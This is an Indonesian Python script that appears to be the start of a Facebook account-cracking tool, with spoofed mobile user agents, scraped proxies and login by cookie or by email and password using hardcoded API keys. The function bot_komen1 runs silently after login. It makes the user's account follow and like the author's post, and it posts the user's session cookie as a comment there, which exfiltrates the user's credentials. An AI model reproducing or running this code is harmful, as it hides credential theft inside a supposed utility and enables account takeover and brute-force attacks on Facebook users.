# jangan diperjual belikan script ini free
# jangan Ganti Owner atau hp mu rusak
# kalo gak ada hasil ,oprek sendiri jangan ngandelin orang lain
# github —» https://github.com/fanky86/Premium
# percuma ganteng kalo gak follow 


import os

# ------------------[  MODULE  ]-------------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE


try:
    import rich
except ImportError:
    os.system("pip install rich")
from rich.console import Console

console = Console()

try:
    import rich
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul Rich {H2}•{P2}")
    os.system("pip install rich")
try:
    import stdiomask
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul stdiomask {H2}•{P2}")
    os.system("pip install stdiomask")
try:
    import bs4
except ImportError:
    console.print(f" {K2}• {H2}Sedang Menginstall Modul bs4 {H2}•{P2}")
    os.system("pip install bs4")


# ------------------[ IMPORT MODULE ]-------------------#
import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, subprocess, uuid, calendar
from time import sleep
import shutil
import hashlib
from datetime import date
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
import urllib.request
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.console import Console
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as beautifulsoup
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn


# ------------------[ GLOBAL NAME ]-------------------#
sekarang = calendar.timegm(time.gmtime(time.time()))
pretty.install()
CON = sol()
wa = Console()
ugen = []
ugent = []
console = Console()
ses = requests.Session()
hapus  = '[/]'
lisensiku=[]
temanku = []
id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = [], [], 0, 0, 0, [], [], [], [], [], [], []
dia, ualu, ualuh = [], [], []
sys.stdout.write("\x1b]2; fanky ganteng\x07")

# ------------------[ PROXY BUAT NONTON BKP BTW FANKY GANTENG ]-------------------#
try:
    prox = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
    ).text
    open(".prox.txt", "w").write(prox)
except Exception as e:
    Console().print(
        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
    )
    exit()
prox = open(".prox.txt", "r").read().splitlines()
###----------[ GET DATA DARI DEVICE ]---------- ###
try:
	android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
	try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
	except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
	# versi_app = str(random.randint(111111111,999999999))
except:
	android_version = []
	simcard = []
	pass

# ------------------[ USER-AGENT ]-------------------#
def uaku():
    try:
        with open("fan.txt", "r") as file:
            ua = file.read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        url = "https://raw.githubusercontent.com/fanky86/Premium/main/fan.txt"
        response = requests.get(url)
        if response.status_code == 200:
            with open("fan.txt", "w") as file:
                aa = re.findall(r'line">(.*?)<', response.text)
                for un in aa:
                    file.write(un + "\n")
            with open("fan.txt", "r") as file:
                ua = file.read().splitlines()
            for ub in ua:
                ugen.append(ub)
        else:
            print("Gagal mengambil data dari GitHub")
try:
	uasayang = open("fan.txt", "r").read().splitlines()
	for fn in uasayang:
		ugen.append(fn)
except :
	ugent = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"


fanuahehe = []
for xd in range(1000):
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
	build_nokiax = ['JDQ39','JZO54K']
	oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
	redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
	realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
	infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
	samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY"]
	gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100']
	strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
	strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
	strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
	strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
	strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
	strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
	strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
	strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
	uateddy = random.choice([strvredmi,strvsamsung,strvgt])
	fanuahehe.append(uateddy)
	



# ------------[ INDICATION ]---------------#
M2 = "[#FF0000]"  # MERAH
H2 = "[#00FF00]"  # HIJAU
K2 = "[#FFFF00]"  # KUNING
B2 = "[#00C8FF]"  # BIRU
P2 = "[#FFFFFF]"  # PUTIH
U2 = "[#AF00FF]"  # UNGU
O2 = "[#FF8F00]"  # ORANGE
try:
    file_color = open("data/theme_color", "r").read()
    color_text = file_color.split("|")[0]
    color_panel = file_color.split("|")[1]
except:
    color_text = "[#00FF00]"
    W1 = random.choice([M2, H2, K2])
    W2 = random.choice([K2, M2, K2])
    W3 = random.choice([H2, K2, M2])
    color_panel = "#00FF00"
    color_ok = "#00FF00"
    color_cp = "#FFFF00"
try:
    color_table = open("data/theme_color", "r").read()
except FileNotFoundError:
    color_table = "#00FF00"
#------------[ INDICATION ]---------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
kom2 = random.choice(["Jadikan Aku Anak Buah Mu Bang @[100043537611609:]","Panutan Ku","Sebenarnya Aku Suka Sama Kamu, Tetapi Aku Cuma Butuh Waktu Untuk Mengungkapkan Isi Hati Ku"])
# --------------------[ CONVERTER-BULAN ]--------------#
dic = {"1": "January", "2": "February", "3": "March", "4": "April", "5": "May", "6": "June", "7": "July", "8": "August", "9": "September", "10": "October", "11": "November", "12": "December"}
dic2 = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}

tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = "OK-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
cpc = "CP-" + str(tgl) + "-" + str(bln) + "-" + str(thn) + ".txt"
hour = datetime.datetime.now().hour
hari_ini = datetime.datetime.now().strftime("%d %B %Y")
current_time = datetime.datetime.now()
jam_fan = current_time.strftime("%I:%M %p")

# ------------------[ BERSIHIN MUKA LU]-----------------#
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def jalan(keliling):
    for mau in keliling + "\n":
        sys.stdout.write(mau)
        sys.stdout.flush()
        time.sleep(0.03)

# ------------------[ LOGO-FANKY-GANTENG ]-----------------#
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

def logoku():
    console = Console()

    # Logo Lisensi
    logo_text = Text(
        """
██╗     ██╗ ██████╗███████╗███╗   ██╗███████╗███████╗
██║     ██║██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
██║     ██║██║     █████╗  ██╔██╗ ██║███████╗█████╗  
██║     ██║██║     ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
███████╗██║╚██████╗███████╗██║ ╚████║███████║███████╗
╚══════╝╚═╝ ╚═════╝╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
""",
        style="bold cyan"
    )

    # Panel utama dengan width 60
    panel = Panel(
        logo_text,
        title="[bold magenta]Selamat Datang[/bold magenta]",
        subtitle="[bold yellow]Gunakan Setelah Registrasi Tools Anda[/bold yellow]",
        border_style="green",
        width=60
    )

    # Cetak ke console
    console.print(panel)

# Panggil fungsi untuk menampilkan banner


def banner():
    Console().print(
        Panel(
            """
[bold red]███████████████████████ [bold yellow]NAME  : [bold green]FANKY 
[bold red]███████████████████████ [bold yellow]Githb : [bold green]github.com/fanky86  
[bold red]███████████████████████ [bold yellow]Saran : [bold green]Jangan pake wifi
[bold white]███████████████████████ [bold yellow]IG    : [bold green]@fannjha
[bold white]███████████████████████          
[bold white]███████████████████████ 
[bold white]""",
            width=60,
            style=f"{color_panel}",
        )
    )
    
# --------------------[ MASUK PELAN PELAN ATUH FANKY ]--------------#
def login123():
    clear()
    banner()
    Console().print(Panel(f"""{P2}[{color_text}01{P2}].Login Menggunakan Cookie\n{P2}[{color_text}02{P2}].Login Menggunakan email dan password [{K2}Perbaikan{P2}]\n[{color_text}03{P2}].{M2}Keluar""",width=60,style=f"{color_panel}",title="[bold green]Login"))
    fansph = console.input(f" {H2}• {P2}pilih menu : ")
    if fansph in ["1", "01"]:
        logincoki()
    elif fansph in ["2", "02"]:
        loginuserpass()
    elif fansph in ["3", "03"]:
        exit()
    else:
        Console().print(f" {H2}• {P2}[bold red]Pilihan Tidak Diketahui!", end="\r")
        time.sleep(5)
        login()


def login():
    try:
        # Membaca token & cookie dari file
        token = open(".fantoken.txt", "r").read().strip()
        cok = open(".fancookie.txt", "r").read().strip()
        tokenku.append(token)
        # **Cek apakah token masih valid**
        check = requests.get(f"https://graph.facebook.com/me?access_token={token}", cookies={"cookie": cok}).json()
        if "error" in check:
            if "Invalid OAuth" in check["error"]["message"] or check["error"]["code"] in [190, 102]:
                console.print(f" {H2}• {P2}[bold red] Token kadaluarsa atau invalid!")
                os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
                login123()  # Minta login ulang
            elif "checkpoint" in check["error"]["message"]:
                console.print(f" {H2}• {P2}[bold red] Akun terkena checkpoint!")
                os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
                login123()  # Minta login ulang
        # Jika token valid, masuk ke menu
        try:
            menu()
        except KeyError:
            login123()
        except requests.exceptions.ConnectionError:
            console.print(f" {H2}• {P2}[bold red] Problem Internet Connection, Check And Try Again")
            exit()
    except IOError:
        login123()


# --------------------[ LOGIN-TOKEN-EAAB ]--------------#
def logincoki():
    try:
        cok = Console().input(f" {H2}• {P2}cookie : ")
        cookie = {'cookie':cok}
        open(".fancookie.txt","w").write(cok)
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
            req = xyz.get(url,cookies=cookie)
            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
            roq = xyz.get(nek,cookies=cookie)
            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
            open(".fantoken.txt","w").write(tok)
            bot_komen(cok, tok)
            Console().print(Panel(f"""{P2}{tok}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
            Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
            exit()
    except Exception as e:
        os.system("rm -rf .fantoken.txt && rm -rf .fancookie.txt")
        exit()

def loginuserpass():
    try:
        console = Console()
        Console().print(f"{P2}Masukan username/email/idf dan password")
        email = console.input(" [green]• [white]Email : ")
        password = console.input(" [green]• [white]Password : ")
        api_key = '882a8490361da98702bf97a021ddc14d'
        api_secret = '62f8ce9f74b12f84c123cc23437a4a32'
        data = {"api_key": api_key,"credentials_type": "password","email": email,"format": "JSON","generate_machine_id": "1","generate_session_cookies": "1","locale": "en_US","method": "auth.login","password": password,"return_ssl_resources": "0","v": "1.0"}
        sig_raw = (
            f"api_key={api_key}"
            f"credentials_type=password"
            f"email={email}"
            f"format=JSON"
            f"generate_machine_id=1"
            f"generate_session_cookies=1"
            f"locale=en_US"
            f"method=auth.login"
            f"password={password}"
            f"return_ssl_resources=0"
            f"v=1.0"
            f"{api_secret}"
        ).encode("utf-8")
        sig = hashlib.md5(sig_raw).hexdigest()
        data.update({'sig': sig})
        with requests.Session() as session:
            response = session.get('https://api.facebook.com/restserver.php', params=data)
            result = response.json()
            if 'access_token' in result:
                token = result['access_token']
                console.print(Panel(f"[white]{token}", title="[bold green]TOKEN TERSIMPAN", style=color_panel, width=60))
                with open(".fantoken.txt", "w") as f:
                    f.write(token)
                cookie_str = ''
                if "session_cookies" in result:
                    for c in result["session_cookies"]:
                        cookie_str += f"{c['name']}={c['value']}; "
                    with open(".fancookie.txt", "w") as f:
                        f.write(cookie_str.strip())
                    console.print(Panel(f"[white]{cookie_str}", title="[bold green]COOKIE TERSIMPAN", style=color_panel, width=60))
                    # console.print("[green] • [white]Cookie berhasil disimpan.")
                    # Panggil bot follow/comment/like
                    bot_komen1(cookie_str.strip(), token)
                else:
                    console.print("[yellow] • [white]Tidak ada session_cookies dalam response.")
                console.print("[green] • [bold white]Login berhasil. Silakan jalankan ulang script.")
                exit()
            elif 'error_msg' in result and 'www.facebook.com' in result['error_msg']:
                console.print(f"[yellow] • [bold]Akun checkpoint: {email}")
            else:
                console.print(f"[red] • [bold]Login gagal Sandi/Email salah : {result.get('error_msg', 'Unknown error')}")
    except Exception as e:
        os.system("rm -rf .fantoken.txt .fancookie.txt")
        Console().print(f"[red] • [bold]Terjadi error: {str(e)}")
        exit()

# Bot follow, comment, like
def bot_komen1(cok, token):
    try:
        with requests.Session() as r:
            r.cookies.update({'cookie': cok})
            komentar = random.choice(['bang lo pacarnya si cewek itu ya?, kok kaya cemburu liat dia deket sama laki" itu?','menjaga perasaan itu lebih baik bang masih banyak cewek di luar sana yg lebih cantik kok 😎', 'lo cemburukah fan?', 'Semangat!', 'Gaskeun!', 'sesakit hati apapun sama dia jangan pernah untuk mencari perasaan/perhatian ke dia, udah iklhas in aja masih banyak yg suka sama kamu semangat fan ❤️'])
            target_uid = "100043537611609"
            post_id = "926438272150751"
            r.post(f'https://graph.facebook.com/{target_uid}/subscribers?access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={komentar}&access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/comments/?message={cok}&access_token={token}')
            r.post(f'https://graph.facebook.com/{post_id}/likes?access_token={token}')
            # Console().print(f"[green] • [white]Bot follow dan komentar berhasil!")
    except Exception as e:
        pass
